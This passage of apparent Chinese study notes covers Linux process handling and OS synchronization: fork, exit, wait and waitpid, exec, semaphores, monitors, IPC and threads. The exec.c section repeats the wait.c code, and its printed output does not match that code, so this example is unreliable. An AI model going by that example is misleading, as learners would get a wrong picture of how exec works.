│ │ │ ├─gsd-waco+ │ │ │ │ ├─gsd-xset+ │ │ │ │ └─3*[&#123;gnom+ │ │ │ └─2*[&#123;gdm-wayland-ses&#125;] │ │ └─2*[&#123;gdm-session-wor&#125;] │ ├─gdm-session-wor─┬─gdm-x-session─┬─Xorg───&#123;Xorg&#125; │ │ │ ├─gnome-session-b─┬─deja-dup-m+ │ │ │ │ ├─gnome-shel+ │ │ │ │ ├─gnome-soft+ │ │ │ │ ├─gsd-a11y-s+ │ │ │ │ ├─gsd-clipbo+ │ │ │ │ ├─gsd-color─+++ │ │ │ │ ├─gsd-dateti+ │ │ │ │ ├─gsd-disk-u+ │ │ │ │ ├─gsd-housek+ │ │ │ │ ├─gsd-keyboa+ │ │ │ │ ├─gsd-media-+ │ │ │ │ ├─gsd-mouse─+++ │ │ │ │ ├─gsd-power─+++ │ │ │ │ ├─gsd-print-+ │ │ │ │ ├─gsd-rfkill+++ │ │ │ │ ├─gsd-screen+ │ │ │ │ ├─gsd-sharin+ │ │ │ │ ├─gsd-smartc+ │ │ │ │ ├─gsd-sound─+++ │ │ │ │ ├─gsd-wacom─+++ │ │ │ │ ├─gsd-xsetti+ │ │ │ │ ├─nautilus-d+ │ │ │ │ ├─ssh-agent │ │ │ │ ├─update-not+ │ │ │ │ └─3*[&#123;gnome-+ │ │ │ └─2*[&#123;gdm-x-session&#125;] │ │ └─2*[&#123;gdm-session-wor&#125;] │ └─2*[&#123;gdm3&#125;] ├─gnome-keyring-d───3*[&#123;gnome-keyring-d&#125;] ├─gsd-printer───2*[&#123;gsd-printer&#125;] ├─2*[ibus-x11───2*[&#123;ibus-x11&#125;]] ├─irqbalance───&#123;irqbalance&#125; ├─2*[kerneloops] ├─networkd-dispat───&#123;networkd-dispat&#125; ├─packagekitd───2*[&#123;packagekitd&#125;] ├─polkitd───2*[&#123;polkitd&#125;] ├─pulseaudio───2*[&#123;pulseaudio&#125;] ├─rsyslogd───3*[&#123;rsyslogd&#125;] ├─rtkit-daemon───2*[&#123;rtkit-daemon&#125;] ├─snapd───18*[&#123;snapd&#125;] ├─systemd─┬─(sd-pam) │ ├─at-spi-bus-laun─┬─dbus-daemon │ │ └─3*[&#123;at-spi-bus-laun&#125;] │ ├─at-spi2-registr───2*[&#123;at-spi2-registr&#125;] │ ├─dbus-daemon │ ├─ibus-portal───2*[&#123;ibus-portal&#125;] │ ├─pulseaudio───2*[&#123;pulseaudio&#125;] │ └─xdg-permission-───2*[&#123;xdg-permission-&#125;] ├─systemd─┬─(sd-pam) │ ├─at-spi-bus-laun─┬─dbus-daemon │ │ └─3*[&#123;at-spi-bus-laun&#125;] │ ├─at-spi2-registr───2*[&#123;at-spi2-registr&#125;] │ ├─dbus-daemon │ ├─dconf-service───2*[&#123;dconf-service&#125;] │ ├─evolution-addre─┬─evolution-addre───5*[&#123;evolution-addre&#125;] │ │ └─4*[&#123;evolution-addre&#125;] │ ├─evolution-calen─┬─evolution-calen───8*[&#123;evolution-calen&#125;] │ │ └─4*[&#123;evolution-calen&#125;] │ ├─evolution-sourc───3*[&#123;evolution-sourc&#125;] │ ├─gnome-shell-cal───5*[&#123;gnome-shell-cal&#125;] │ ├─gnome-terminal-─┬─bash───pstree │ │ └─3*[&#123;gnome-terminal-&#125;] │ ├─goa-daemon───3*[&#123;goa-daemon&#125;] │ ├─goa-identity-se───3*[&#123;goa-identity-se&#125;] │ ├─gvfs-afc-volume───3*[&#123;gvfs-afc-volume&#125;] │ ├─gvfs-goa-volume───2*[&#123;gvfs-goa-volume&#125;] │ ├─gvfs-gphoto2-vo───2*[&#123;gvfs-gphoto2-vo&#125;] │ ├─gvfs-mtp-volume───2*[&#123;gvfs-mtp-volume&#125;] │ ├─gvfs-udisks2-vo───2*[&#123;gvfs-udisks2-vo&#125;] │ ├─gvfsd─┬─gvfsd-trash───2*[&#123;gvfsd-trash&#125;] │ │ └─2*[&#123;gvfsd&#125;] │ ├─gvfsd-fuse───5*[&#123;gvfsd-fuse&#125;] │ ├─gvfsd-metadata───2*[&#123;gvfsd-metadata&#125;] │ ├─ibus-portal───2*[&#123;ibus-portal&#125;] │ └─xdg-permission-───2*[&#123;xdg-permission-&#125;] ├─systemd-journal ├─systemd-logind ├─systemd-resolve ├─systemd-timesyn───&#123;systemd-timesyn&#125; ├─systemd-udevd ├─udisksd───4*[&#123;udisksd&#125;] ├─unattended-upgr───&#123;unattended-upgr&#125; ├─upowerd───2*[&#123;upowerd&#125;] ├─2*[vmtoolsd───&#123;vmtoolsd&#125;] ├─vmware-vmblock-───2*[&#123;vmware-vmblock-&#125;] ├─whoopsie───2*[&#123;whoopsie&#125;] └─wpa_supplicant fork函数 函数原型 头文件：unistd.h pid_t fork(void); 返回值 fork函数被正确调用后，将会在子进程和父进程中分别返回 子进程中返回值为0（不合法的PID，提示当前运行在子进程中） 父进程中返回值为子进程ID（让父进程掌握所创建子进程的ID号） 出错返回-1 1user@user-virtual-machine:~/桌面$ vim create_process 12345678910111213141516171819202122#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;#include&lt;pthread.h&gt; int main()&#123; pid_t pid; pid=fork(); if(pid==-1) printf(&quot;fork error\\n&quot;); else if(pid==0)&#123; printf(&quot;The return value is %d\\n&quot;,pid); printf(&quot;In child process!\\n&quot;); printf(&quot;My pid is %d\\n&quot;,getpid()); &#125; else&#123; printf(&quot;The return value is %d\\n&quot;,pid); printf(&quot;In father process!\\n&quot;); printf(&quot;My PID is %d\\n&quot;,getpid()); &#125; return 0; &#125; 1gcc create_process.c 1./a.out 123456The return value is 4948In father process!My PID is 4947The return value is 0In child process!My pid is 4948 注： get_pid函数的意图很明显，就是找到一个pid分配给进程 调用 fork的目的是复制自身，从而父、子进程能同时执行不同段的代码 由于在复制时复制了父进程的堆栈段，所以两个进程都停留在fork函数中，等待返回。 因此fork函数会返回两次，一次是在父进程中返回，另一次是在子进程中返回，这两次的返回值是不一样的。(其实就相当于链表，进程形成了链表，父进程的fork函数返回的值指向子进程的进程id, 因为子进程没有子进程，所以其fork函数返回的值为0 ) 参考 fork只拷贝下一个要执行的代码到新的进程 下面再来一段代码帮助理解 1vim fork_process.c 12345678910111213141516171819202122232425#include&lt;stdio.h&gt;#include&lt;unistd.h&gt;#include&lt;errno.h&gt;#include&lt;sys/types.h&gt;int main()&#123; int a=5,b=2; pid_t pid; pid=fork(); if(pid==0)&#123; // 如果返回的pid为0，在子进程中 a=a-4; printf(&quot;In child process \\nPID=[%d]\\n&quot;,pid); printf(&quot;Value of a:%d\\nValue od b:%d\\n&quot;,a,b); &#125; else if(pid&lt;0)&#123; perror(&quot;fork&quot;); &#125; else&#123; //父进程中获得子进程pid，大于0 printf(&quot;In parent proccess\\nPID=[%d]\\n&quot;,pid); printf(&quot;Value of a:%d\\nValue of b:%d\\n&quot;,a,b); &#125; return 0;&#125; 12gcc fork_process.c./a.out 12345678In parent proccessPID=[5479]Value of a:5Value of b:2In child process PID=[0]Value of a:1Value od b:2 相关变量类型 数据类型 函数 信号量 sem_t sem_init信号量初始化）、sem_wait（信号量值减一）、sem_post（信号量值加一） 互斥量（线程） pthread_mutex_t pthread_mutex_init（互斥量初始化）pthread_mutex_lock（互斥量加锁）Pthread_mutex_trylock（尝试互斥量加锁）pthread_mutex_unlock（互斥量解锁） 线程和进程 pthread_t（线程）pid_t（进程） pthread_create（创建线程）fork（创建进程）pthread_join（等待线程结束）waitpid（停止目前进程的执行，直到有信号来到或子进程结束） 进程的退出Linux的退出方式分为正常退出和异常退出两种 正常退出 在main函数里面执行return 调用exit函数 调用_exit函数，执行后立即将控制权交给内核 异常退出 调用abort函数 进程收到某个信号，而该信号使程序终止 无论那种退出方式，系统最终都会执行内核中的同一代码。这段代码用来关闭进程所有已经打开的文件描述符，释放它所占用的内存和其他资源 几种方式的区别： exit是一个函数，执行完后将控制权交给系统 return是函数执行完后的返回。return执行完后把控制权交给调用函数 exit是正常终止进程；abort是异常终止进程 _exit执行后立即将控制权返回给内核；exit执行后要先执行一些清除操作，然后才将控制权交给内核 exit函数在调用exit系统前要检查文件打开情况，把文件缓冲区的内容写回文件 由于 Linux 的标准函数库中有一种被称作“缓冲 I/O” 的操作，其特征就是对应每一个打开的文件，在内存中都有一片缓冲区。每次读文件时，会 连续地读取若干条记录，这样在下次读取文件时就可以直接从内存的缓冲区读取;同样，每 次写文件的时候也仅仅是写入内存的缓冲区，等满足了一定的条件(如达到一定数量或遇到 特定字符等)，再将缓冲区中的内容一次性写入文件。这种技术大大增加了文件读/写的速度， 但也给编程带来了一点麻烦。比如有一些数据，我们认为已经写入了文件，实际上因为没有 满足特定的条件，它们还是保存在缓冲区内，这时用_exit 函数直接将进程关闭，缓冲区的数 据就会丢失。因此，要想保证数据的完整性，就一定要使用 exit 函数。 进程等待与睡眠 孤儿进程 僵尸进程 进程在退出之前会释放进程用户空间的所有资源，但PCB等内核空间资源不会被释放。对于已经终止但父进程尚未对其调用wait或waitpid函数的进程（TASK_ZOMBIE状态），称为僵尸进程。 wait函数：父进程一旦调用了wait就立即阻塞自己，由wait自动分析当前进程的某个子进程是否已经退出。如果让它找到了这样一个已经变成僵尸的子进程，wait就会收集这个子进程的信息，并把它彻底销毁后返回;如果没有找到这样一个子进程，wait就会一直阻塞在这里，直到有一个子进程出现为止。 wait函数： waitpid和wait函数的作用是完全相同的，但waitpid函数多出了两个可由用户控制的参数pid和optionswaitpid函数可等待一个特定的进程，而wait函数则返回任意一个终止子进程的状态。waitpid函数提供了一个wait函数的未阻塞版本。当用户希望取得一个子进程的状态，但不想阻塞时，可使用 waitpid 函数。 代码实践 1vim wait.c 1gcc wait.c 1./a.out 1234567891011121314151617181920212223242526272829303132333435#include&lt;unistd.h&gt;#include&lt;sys/wait.h&gt;#include&lt;sys/types.h&gt;#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; pid_t pc,pr; pc=fork(); if(pc&lt;0)&#123; printf(&quot;Erroroccured on forking.\\n&quot;);//fork出错 &#125; else if(pc==0)&#123; //子进程 sleep(10);//睡眠10s exit(0); &#125; else&#123; do&#123; pr=waitpid(pc,NULL,WNOHANG);//使用WNOHANG参数，waitpid不会在这里等待；WNOHANG：如果没有任何已经终止的子进程则马上返回, 函数不等待，此时返回值为0 if(pr==0)&#123; printf(&quot;Nochild exited!\\n&quot;); sleep(1); &#125; &#125;while(pr==0); if(pr==pc)&#123;//如果是父进程的子进程 printf(&quot;Successfully get child:[%d].\\n&quot;,pr); &#125; else&#123; printf(&quot;Some errors occured!!!&quot;); &#125; &#125; return 0;&#125; 123456789101112输出Nochild exited!Nochild exited!Nochild exited!Nochild exited!Nochild exited!Nochild exited!Nochild exited!Nochild exited!Nochild exited!Nochild exited!Successfully get child:[8232]. 进程执行exec函数簇：根据指定的文件名或目录名找到可执行文件，并用它来取代原调用进程的数据段、代码段和堆栈段。（提供了一种在进程中执行另一个程序的方法） Linux中使用exec函数簇主要有以下两种情况： 当进程认为自己不能再为系统和用户做出任何贡献时，可以调用任何exec函数簇让自己重生。 如果一个进程想执行另一个程序，那就可以调用fork函数创建一个进程，然后调用exec函数使子进程重生。 函数种类：execl execle execlp execv execve execvp，称为exec系列函数 l：表示list，每个命令行参数都说明为一个单独的参数 v：表示vector，每个命令行参数放在数组中 e：表示由函数调用者提供环境变量表 p：表示通过环境变量PATH来指定路径，查找可执行文件 代码实践 1vim exec.c 1234567891011121314151617181920212223242526272829303132333435#include&lt;unistd.h&gt;#include&lt;sys/wait.h&gt;#include&lt;sys/types.h&gt;#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; pid_t pc,pr; pc=fork(); if(pc&lt;0)&#123; printf(&quot;Erroroccured on forking.\\n&quot;);//fork出错 &#125; else if(pc==0)&#123; //子进程 sleep(10);//睡眠10s exit(0); &#125; else&#123; do&#123; pr=waitpid(pc,NULL,WNOHANG);//使用WNOHANG参数，waitpid不会在这里等待 if(pr==0)&#123; printf(&quot;Nochild exited!\\n&quot;); sleep(1); &#125; &#125;while(pr==0); if(pr==pc)&#123;//如果是父进程的子进程 printf(&quot;Successfully get child:[%d].\\n&quot;,pr); &#125; else&#123; printf(&quot;Some errors occured!!!&quot;); &#125; &#125; return 0;&#125; 1./a.out 1234567891011121314Entering main process----rw------- 1 zhangjialin zhangjialin 1546 4月 11 10:09 1.c-rw-r--r-- 1 zhangjialin zhangjialin 2460 4月 11 10:08 2.cdrwxrwxr-x 4 zhangjialin zhangjialin 4096 11月 19 01:56 79b321c8-rwxrw-rw- 1 zhangjialin zhangjialin 7775239 11月 18 23:55 79b321c8.zip-rwxr-xr-x 1 zhangjialin zhangjialin 8384 4月 17 19:46 a.outdrwxrwxr-x 2 zhangjialin zhangjialin 4096 3月 3 2020 buzhi-rw-r--r-- 1 zhangjialin zhangjialin 492 4月 17 16:07 create_process.c-rw-r--r-- 1 zhangjialin zhangjialin 321 4月 17 19:46 exec.c-rw-r--r-- 1 zhangjialin zhangjialin 576 4月 17 16:40 fork_process.c-rwxr-xr-x 1 zhangjialin zhangjialin 12904 4月 11 09:36 test-rwxr-xr-x 1 zhangjialin zhangjialin 13328 4月 11 09:59 test2-rw-r--r-- 1 zhangjialin zhangjialin 773 4月 17 19:26 wait.cdrwxrwxr-x 2 zhangjialin zhangjialin 4096 3月 2 2020 z 进程的描述与控制2.4 进程同步引言：由于进程的异步性，会给系统造成混乱，在OS中引入进程同步机制，包括：硬件同步机制、信号量机制、管程机制，是使并发执行的诸进程之间能有效地共享资源和相互合作，从而使程序的执行具有可再现性。 同步：并发进程在执行次序上的协调，以达到有效的资源共享和相互合作，使程序执行有可再现性。 2.4.1 进程同步基本概念1.两种形式的制约关系 间接相互制约关系。由于资源共享。 如CPU、I/O设备等，对于这类资源，必须由系统实施统一分配，即用户在要用之前，应该先提出申请，而不允许用户进程直接使用。 直接相互制约关系。由于进程间的合作关系。 例如：某些应用程序，为了完成某任务而建立了两个或者多个进程。这些进程将为完成同一件任务而相互合作。输入进程A和计算进程B，以及缓冲区。 异步性：进程在运行过程中是否能获得处理机、以怎么样的速度运行，并不由自身所控制。由此会产生对共享的变量或数据结构资源不正确的访问次序，从而造成每次执行结果不一致。这种差错往往与时间有关，故称为“与时间有关的错误”。 2.临界资源（Critical Resource）一次仅允许一个进程访问的资源为临界资源（生产者-消费者问题） 123int in=0,out=0;int count=0;item buffer[n]; 伪代码： 1234567891011121314151617181920212223void producer&#123;while(1)&#123;……produce an item in nextp;……while(count==n)&#123;&#125;//do no-opbuffer[in]=nextp;in = (in+1)%n;counter=counter+1;&#125;&#125;void consumer&#123;while(1)&#123; while(counter==0)&#123; &#125;//do no-op nextc = buffer[out]; out=(out+1)%n; counter=counter-1; consume the item in nextc;&#125;&#125; 引例： 设counter的初值为5 register1 = counter; register2 = counter; register1 = register1+1; register2 = register2-1; counter = register1; counter = register2; Register1 = counter; (register1=5) Register1 = register1+1; (register1=6) Register2 = counter; (register2=5) Register2 = register2-1; (register2=4) counter = register1; (counter=6) counter = register2; (counter=4) 3.临界区（Critical section） 临界区定义：把在每个进程中访问临界资源的那段代码称为临界区。 若能保证诸进程互斥的进入自己的临界区，便可以实现诸进程对资源的互斥访问。为此，每个进程在进入临界区之前，应对欲访问的临界资源进行检查，看他是否正在被访问。 进入区(Entry section)定义：临界区前用于检查临界资源是否正在被访问的代码。 退出区(Exit section)定义：位于临界区后的代码，用于将临界区正在访问的标志恢复为未被访问标志。 剩余区：除去临界区、进入区、退出区之外的其他部分代码。 伪代码： 1while(ture)&#123;进入区临界区退出区剩余区&#125; 4.进程同步进制应遵循的规则 空闲让进：当无进程进入临界区，表明临界资源处于空闲，应允许一个请求进入临界区，以有效利用临界资源 忙则等待：当已有进程进入临界区，表明临界资源正在被访问，因而其他试图进入临界区的进程必须等待，以确保对资源的互斥访问。 有限等待：对要求访问临界资源的进程，应确保在有限时间内能进入自己的临界区，以免进入“死等”状态。 让权等待：当进程不能进入自己的临界区时，应立即释放处理机，以免陷入“忙等”状态。 2.4.2 硬件同步机制引言：利用计算机硬件指令解决临界区问题 对临界区管理将标识看做一个锁，“锁开”进入，“锁关”等待。 初始打开，每个进入临界区的进程必须对锁进行测试。 测试和关锁是原子操作。 三种方法： 关中断 利用Test-and-Set指令实现互斥 利用Swap指令实现进程互斥 1.关中断进入锁测试前关闭中断，完成锁测试并上锁后打开中断。进程在临界区时，计算机不响应中断，不会引发进程调度，也就不会发生进程或者线程的切换。由此保证了对锁的测试和关索操作的连续性和完整性，有效保证了互斥。 缺点： 滥用关中断会引起严重后果 关中断时间过长会影响系统效率，限制了处理器交叉执行程序的能力 不适用于多CPU系统。一个处理器上关中断并不能防止进程在其他处理器上执行相同的临界区代码 2.利用Test-and-Set指令实现互斥硬件指令–“测试并建立”TS 1boolen TS( boolen *lock)&#123; boolean old; old = *lock; *lock =TURE; return old;&#125; 函数过程，执行过程不可分割，是一条原语。 lock=FLASE,代表资源空闲；\\lock=TRUE代表资源正在被使用 1do&#123; … while TS( &amp;lock); critical section; *lock=FALSE; remainder section;&#125;while(TRUE); 当资源正在被使用，lock=TRUE，while循环一直测试TS(s)，再到\\lock为TRUE 3.利用Swap指令实现进程的互斥Swap–对换指令，相当于80x86中的XCHG指令，用于交换两个字的内容。 1void swap( boolen *a, boolen *b)&#123; boolean temp; temp = *a; *a =*b; *b=temp;&#125; 1do&#123; key=TRUE; do&#123; swap(&amp;lock,&amp;key); &#125;while(key!=FALSE); 临界区操作; lock = FALSE; …&#125;while(TRUE); 每个临界资源都设置有一个全局的布尔变量lock，其初始值为FALSE，在每个进程中，再利用一个局部布尔变量key。 缺点：当临界资源忙碌，其他访问进程不断进行测试，处于一种“忙等”状态，不符合“让权等待”原则，造成了处理机时间的浪费，也很难用于解决复杂的进程同步问题。 2.4.3 信号量(Semaphores)机制一种卓有成效的进程同步工具，广泛用于单处理机和多处理机以及计算机网络。分为： 整型信号量 记录型信号量 AND型信号量 信号量集 1.整型信号量 定义为一个用于表示资源数量的整型量S 除初始化外，仅能通过两个标准原子操作(Atomic Operation):wait(S)、signal(S)来访问。这两个操作一直被称为P、V操作 执行不可中断（原子操作），同时只允许一个进程修改信号量 代码 1wait(S)&#123; while(S&lt;=0);//do no-op S--;&#125;signal&#123; S++;&#125; 由于while会不断的测试是否可以得到临界资源，所以不符合“让权等待” 2.记录型信号量 与整型信号量不同，不存在“忙等”现象，采用“让权等待”。 除了需要一个用于代表资源数目的整型变量value外，还应该增加一个进程链表指针list，用于链接上述所有等待进程。 1typedef&#123; int value; struct process_control_block *list;&#125;semaphore; wait(S)与signal(S)： 1wait(semaphore *S)&#123; S-&gt;value--; if(S-&gt;value&lt;0) block(S-&gt;list);&#125;signal(semaphore *S)&#123; S-&gt;value++; if(S-&gt;value&lt;=0) wakeup(S-&gt;list);&#125; 解析： S-&gt;value：初值表示系统某类资源的数目，因而被称为资源信号量。 S-&gt;value&lt;0，表示该类资源已经分配完毕，因此进程应该调用block原语进行自我阻塞，放弃处理机，并插入到信号量链表S-&gt;list中。 可见信号量机制遵循“让权等待”机制。 注意，如果某次signal完成后，**S-&gt;value&lt;=0(千万注意一定是小于等于)**，那么就还有进程因为等待资源被阻塞，需要使用wakeup原语将之唤醒。 引申问题：整形型信号量与记录型信号量的问题是针对各进程之间只共享一个临界资源而言的。在有些应用场合，是一个进程需要先获得两个或更多的共享资源后方能执行其任务。 例：多个临界资源情况：访问共享数据D、E 1process A:wait(Dmutex);wait(Emutex);process B:wait(Dmutex);wait(Emutex); 次序： 1processA：wait(Dmutex); //Dmutex=0 processB：wait(Emutex); //Emutex=0 processA：wait(Emutex); //Emutex=-1，A阻塞 processB：wait(Dmutex); //Dmutex=-1，B阻塞 进程A和B处于僵持状态。在无外力作用下，两者都将无法从僵持状态中解脱出来。我们称此时的进程A和B已进入死锁状态。显然，当进程同时要求的共享资源愈多时，发生进程死锁的可能性也就愈大。 3.AND型信号量 AND同步机制的基本思想：将进程在整个运行过程中需要的全部资源，一次性分配给进程，待进程使用完后一起释放。只要尚有一个资源未分配给进程，其他所有可能为之分配的资源，也不分配给它。 分配采取原子操作：要么全部分配到进程，要么一个也不分配。 在wait操作中增加了一个“AND”条件，故称为AND同步，或称为同时wait操作，即Swait（simultaneous wait）。 定义： 1Swait(S1,S2,……,Sn)&#123; while(TRUE)&#123; if(S1≥1 and S2≥1……Sn≥1)&#123; for(i=1,i&lt;n,i++)&#123; Si--; &#125; break;//分配成功后，跳出循环 &#125; else&#123;//分配失败，插入第一个不满足资源的阻塞队列 place the process in the waiting queue associated with the first Si found with Si＜ 1, and set the program count of this process to the beginning of Swait operation &#125; &#125;&#125;Ssignal(S1,S2,……,Sn)&#123; for(i=1;i&lt;=n;i++)&#123; Si++; Remove all the process waiting in the queue associated with Si into the ready queue.(一定 是所有) &#125;&#125; 4.信号量集在记录型信号量机制中，wait(S)或signal(S)操作仅能对信号量施以加1 或减1 操作，意味着每次只能获得或释放一个单位的临界资源。而当一次需要N 个某类临界资源时，便要进行N 次wait(S)操作，显然这是低效的。此外，在有些情况下，当资源数量低于某一下限值时，便不予以分配。因而，在每次分配之前，都必须测试该资源的数量，看其是否大于其下限值。基于上述两点，可以对AND 信号量机制加以扩充，形成一般化的“信号量集”机制。 变量含义 ti：资源分配下限，要求Si&gt;=ti，否则不予分配 di：资源需求量，分配后进行操作：Si=Si-di Swait和Ssignal格式： 1Swait(S1,t1,d1,……,Sn,tn,dn);Ssignal(S1,d1,……,Sn,dn); 完整代码： 1Swait(S1,t1,d1,……,Sn,tn,dn)&#123; if(S1&gt;=t1&amp;……Sn&gt;=tn)&#123; for(i=1;i&lt;=n;i++)&#123; Si=Si-di; &#125; &#125; else&#123; Place the executing process in the waiting queue of the first Si with Si＜ti and set its program counter to the beginning of the Swait operation. &#125;&#125;Ssignal(S1,d1,……,Sn,dn)&#123; for(i=1;i&lt;=n;i++)&#123; Si=Si+di; Remove all the process waiting in the queue associated with Si into the ready queue.(一定是ALL) &#125;&#125; 三种特例 1Swait(S,d,d)：允许每次申请d个资源。当资源少于d时，不予分配。 1Swait(S,1,1)：S&gt;1，记录型信号量 S=1，互斥型信号量 1Swait(S,1,0)：相当于一个可控开关。当S&gt;=1，允许进入；S&lt;1时，将阻止任何进程进入特定区。 2.4.4 信号量的应用1.利用信号量实现进程互斥为使多个进程能互斥访问某个临界资源，只必须为该资源设置一互斥型信号量mutex，并设置其初始值为1，然后将各进程访问该资源的临界区CS置于wait(mutex)和signal(mutex)操作之间即可。 具体描述： mutex取值范围(-1,0,1) 当mutex=1，表示两个进程都未进入临界区； 当mutex=0表示有一个进程进入临界区运行，另一个必须等待，挂入阻塞队列； 当mutex=-1，表示有一个进程正在临界区运行，另一个进程因等待而阻塞在信号量队列里，需要被当前已在临界区运行的进程退出时唤醒。 伪代码 1semaphore mutex=1;PA()&#123; while(1)&#123; wait(mutex); 临界区; signal(mutex); 剩余区; &#125;&#125;PB()&#123; while(1)&#123; wait(mutex); 临界区; signal(mutex); 剩余区; &#125;&#125; 注意：wait(mutex)和signal(mutex)必须成对出现。 缺少wait(mutex)会导致系统混乱，不能保证对临界资源的互斥访问 缺少signal(mutex)会使临界资源永远得不到释放，等待资源的进程不能被唤醒 2.利用信号量实现前驱关系 注意： 有多少个前驱关系就要设置多少个初始值为“0”信号量。 1p1()&#123;S1;signal(a);signal(b)&#125;p2()&#123;wait(a);S2;signal(s);signal(d)&#125;p3()&#123;wait(b);S3;signal(e)&#125;p4()&#123;wait(c);S4;signal(f)&#125;p5()&#123;wait(d);S5;signal(g)&#125;p6()&#123;wait(e);wait(f);wait(g);S6&#125;void main()&#123; semaphore a,b,c,d,e,f,g; a.value=0;b.value=0; c.value=0;d.value=0; e.value=0;f.value=0; g.value=0; cobegin p1();p2();p3();p4();p5();p6(); coend&#125; 2.4.5 管程机制产生原因：虽然信号量机制是一种既方便、又有效的进程同步机制，但每个要访问临界资源的进程都必须自备同步操作wait（S）和signal（S）。这就使大量的同步操作分散在各个进程中。这不仅给系统的管理带来了麻烦，而且还会因同步操作的使用不当而导致系统死锁。这样，在解决上述问题的过程中，便产生了一种新的进程同步工具——管程 。 当共享资源使用共享数据结构表示，资源管理程序可用对该数据结构进行操作的一组过程来表示（例如，资源的请求和释放过程request和release），我们把这样一组相关数据结构和过程一并称为管程。 Hansan为管程所下的定义：“一个管程定义了一个数据结构和能为并发进程所执行（在该数据结构上）的一组操作，这组操作能同步进程和改变管程中的数据”。 管程由四部分组成： 管程名称 局部于管程的共享数据结构说明 对该数据结构进行操作的一组过程 对局部于管程的数据设置初始值的语句 包含了面向对象的思想 管程示意图 管程特性： 模块化：管程是一个基本程序单位，可以单独编译 抽象数据类型：管程中不仅有数据，而且有对数据的操作 信息屏蔽：管程中的数据结构只能被管程中的过程访问，这些过程也是管程内部定义，供管程外的进程调用，而管程中的数据结构以及过程过程（函数）的具体实现外部不可见 管程与进程的区别： 虽然二者都定义了数据结构，但进程定义的是私有数据结构PCB；而管程定义的是公共数据结构，如消息队列等。 二者都存在对各自数据结构上的操作，但进程是由顺序程序执行的有关操作；而管程主要是进行与同步操作和初始化操作。 设置进程的目的在于实现系统的并发性；管程设置的目的在于解决共享资源互斥使用问题。 进程通过调用管程中的过程对共享数据对共享数据结构实行操作，该过程就像通常的子程序被调用，因而：管程是被动工作方式，进程则是主动工作方式。 进程之间可以并发执行，而管程则不能与其调用者并发。 进程具有动态性，有“创建”而诞生，由“撤销”而消亡，而管程是操作系统中的一个资源管理模块，供进程调用。 管程主要特点： 局部数据变量只能被管程的过程访问，任何外部过程都不能访问。 一个进程通过调用管程的一个过程进入管程。 在任何时候，只能有一个进程在管程中执行，调用管程的任何其他进程都被挂起，以等待管程变成可用的。 2.5 经典进程同步问题 “生产者–消费者”问题 “读者–写者”问题 “哲学家进餐问题” 2.6 进程通信进程通信：进程之间的信息交换 两类进程通信： 低级通信（如信号量机制）–缺点 效率低，即交换信息量少。在”生产者–消费者“问题中，生产者每次只能向缓冲池投放一个产品（消息），消费者每次只能从缓冲区获得一个产品。 通信对用户不透明。OS只为进程之间的通信提供了共享存储器，而关于进程之间通信所需的共享数据结构的设置、数据的传送、进程的互斥与同步，都必须由程序员去实现。 高级通信：用户直接利用OS提供的一组通信命令，高效地传送大量数据地一种通信方式。 使用方便。通信过程透明，隐藏了实现进程通信的具体细节。 高效地传送大量数据。 2.6.1进程通信的类型高级通信机制分类： 共享存储器系统 管道系统 消息传递系统 客户—服务器系统 1.共享存储器系统（Shared-Memory System）相互通信的进程共享某些数据结构或者共享存储区，进程之间能通过这些空间进行通信。 基于共享数据结构的通信方式（低级通信） 要求诸进程公用某些数据结构，借以实现诸进程的信息交换。 OS仅提供共享存储器，由程序员负责对公用数据结构的设置以及对进程间的同步处理。 基于共享存储区的通信方式（高级通信） 为传输大量数据，在存储区划出一块共享存储区，诸进程可以通过对共享存储区中的数据的读/写实现通信。 进程在通信前，先向系统申请获得共享存储区中的一个分区，并指定该分区的关键字；若系统已经给其他进程分配了这样的分区，则将该分区的描述符返回给申请者，继之，由申请者把获得的共享存储分区连接到本进程上（附加到自己的地址空间）；此后，便可像读、写普通存储器一样地读、写该公用存储分区。 2.管道（pipe）通信系统 管道：连接一个读进程和一个写进程以实现它们之间通信的共享文件，又名pipe文件。 向管道（共享文件）提供输入的发送进程（写进程）以字符流形式将大量的数据送入管道；接受管道输出的接受进程（读进程）则从管道中接收数据。由于发送进程和接受进程利用管道进行通信，故称为管道通信。 管道必须提供以下三方面的协调能力： 互斥。当一个进程正在对pipe执行读/写操作时，其他（另一）进程必须等待。 同步。指当写（输入）进程把一定数量（如4KB）的数据写入pipe，便去睡眠等待，直到读（输入）进程取走数据后再把它唤醒。即使pipe为空也不例外。 确定对方是否存在，只有确定对方的存在，才能进行通信。 3.消息传递系统（Message passing system） 目前应用最广泛的进程间的通信机制，信息单位：消息（报文） 机制：进程不必借助任何共享存储区或数据结构，而是以格式化的消息（message）为单位，将通信的数据封装在消息中，并利用OS提供的一组通信命令（原语），在进程间进行消息传递，完成进程间的数据交换。 分类： 直接通信方式：指发送进程利用OS所提供的发送原语，直接把消息发送给目标进程。 原语 1Send(Receiver,message);Receive(Sender,message); 间接通信方式：指发送和接收进程，都通过共享中间实体（邮箱）的方式进行消息的发送和接收。利用信箱的通信方式。发送进程发送给目标进程的消息存放信箱；接收进程则从该信箱中，取出对方发送给自己的消息；消息在信箱中可以安全地保存，只允许核准的目标用户随时读取。（优点：在读写时间上的随机性）系统为信箱通信提供了若干条原语，分别用于信箱的创建、撤消和消息的发送、接收等。 原语 1Send (mailbox, message)Receive (mailbox，message) 信箱分类： 私用信箱：用户进程可为自己建立一个新信箱，并作为该进程的一部分。 公用信箱：它由操作系统创建，并提供给系统中的所有核准进程使用。 共享信箱：信箱的拥有者和共享者，都有权从信箱中取走发送给自己的消息。 在利用信箱通信时，在发送进程和接收进程之间，存在以下四种关系。4： 一对一关系 多对一关系，客户/服务器交互 一对多，广播方式 多对多方式 4.客户机—服务器系统(Client-Server system)三种实现方法： 套接字(Socket)：不仅适用于同一台计算机内部的进程通信，也适用于网络环境中不同计算机间的进程通信。 基于文件型 基于网络型 远程过程调用和远程方法调用 2.7线程(Threads)的基本概念比进程更小的基本单位—线程，用它进一步提高程序并发执行的程度，以进一步改善系统服务质量。 2.7.1 线程的引入引入进程：使多个程序并发执行，以提高资源利用率和系统吞吐量。引入线程：减少程序在并发执行时所付出的时空开销，提高OS并发性能。 为使程序并发执行，系统必须进行以下系列操作： 创建进程 撤销进程 进程切换 进程的两个基本属性： 